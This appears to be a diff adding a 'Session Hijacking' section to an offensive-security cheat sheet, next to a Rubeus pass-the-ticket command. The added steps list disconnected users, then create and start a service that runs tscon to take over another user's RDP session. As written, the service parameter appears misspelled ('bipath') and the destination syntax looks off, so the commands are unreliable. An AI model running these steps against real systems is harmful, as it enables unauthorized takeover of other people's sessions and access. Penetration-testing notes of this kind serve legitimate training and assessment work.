@@ -137,3 +137,18 @@ Create a session variable and disable defences:
 ```powershell
  .\Rubeus.exe ptt /ticket:<BASE64 TICKET>
 ```
+
+### Session Hijacking
+
+Query users (to see who is disconnected)
+
+```powershell
+query user
+```
+
+```powershell
+sc create sesshijack bipath="cmd.exe /k tscon <ID> /dest::rdp-tcp#<ID>"
+
+net start sesshijack
+```
+
